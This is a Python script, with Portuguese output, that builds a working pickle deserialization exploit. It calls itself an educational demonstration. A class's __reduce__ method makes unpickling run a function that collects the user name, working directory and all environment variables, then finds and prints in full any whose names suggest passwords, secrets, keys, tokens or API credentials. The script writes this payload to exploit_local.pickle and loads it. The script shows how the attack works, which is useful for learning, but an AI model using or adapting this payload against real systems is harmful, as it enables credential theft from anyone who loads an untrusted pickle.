import pickle
import os
import sys
import json

def collect_and_display():
    import os, json, sys
    
    print("Dados coletados pelo exploit")
    

    def get_safe_username():
        env_vars = ['USER', 'USERNAME', 'LOGNAME']
        for var in env_vars:
            if var in os.environ and os.environ[var]:
                return os.environ[var]
        try:
            if hasattr(os, 'getlogin'):
                return os.getlogin()
        except (OSError, AttributeError):
            pass
        
        try:
            import getpass
            return getpass.getuser()
        except:
            pass
        
       
        try:
            import pwd
            return pwd.getpwuid(os.getuid())[0]
        except:
            pass
        
        return 'unknown'
    
    data = {
        'user': get_safe_username(),
        'cwd': os.getcwd(),
        'env': dict(os.environ),
        'python_version': sys.version,
        'platform': sys.platform,
        'system': 'Demonstração Educacional',
        'pid': os.getpid()
    }
    
    print(f"\nINFORMAÇÕES DO SISTEMA:")
    print(f"Usuário: {data['user']}")
    print(f"Diretório atual: {data['cwd']}")
    print(f"Python: {data['python_version'].split()[0]}")
    print(f"Plataforma: {data['platform']}")
    print(f"PID: {data['pid']}")
    
    print(f"\nVARIÁVEIS DE AMBIENTE ({len(data['env'])} no total):")
    
    env_keys = list(data['env'].keys())
    for i, key in enumerate(env_keys[:10]):
        value = data['env'][key]
        if len(value) > 50:
            value = value[:47] + "..."
        print(f"   {i+1:2d}. {key} = {value}")
    
    if len(env_keys) > 10:
        print(f"   ... e mais {len(env_keys) - 10} variáveis")
    
    print(f"\n Dados sensíveis ")
    sensitive_keys = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API', 'AUTH']
    found = []
    
    for key in env_keys:
        for pattern in sensitive_keys:
            if pattern in key.upper():
                value = data['env'][key]
                found.append((key, value, len(value)))
                break
    
    if found:
        print(f"{len(found)} variáveis sensíveis")
        for key, value, length in found:
            print(f"      • {key}: {value} ({length} caracteres)")
    else:
        print(f"Nenhuma variável com nome sensível encontrada")
    
    print(f"\n RESUMO:")
    print(f"   • Total de dados coletados: {len(json.dumps(data))} bytes")
    print(f"   • Variáveis de ambiente: {len(data['env'])}")
    print(f"   • Sistema: {sys.platform}")
    
    
class LocalDataCollector:
    def __reduce__(self):
        return (collect_and_display, ())


print("Criando o pickle exploit")

stealer = LocalDataCollector()
malicious_pickle = pickle.dumps(stealer)

print(f"Pickle criado: {len(malicious_pickle)} bytes")
print(f" hex:  {malicious_pickle.hex()[:50]}...")

with open('exploit_local.pickle', 'wb') as f:
    f.write(malicious_pickle)

print(f"\n===> exploit_local.pickle")

print(f"\nLendo exploit  {len(malicious_pickle)} bytes")

print("Executando")

try:
    result = pickle.loads(malicious_pickle)
except Exception as e:
    print(f"Erro durante pickle.loads(): {type(e).__name__}: {e}")
    import traceback
    traceback.print_exc()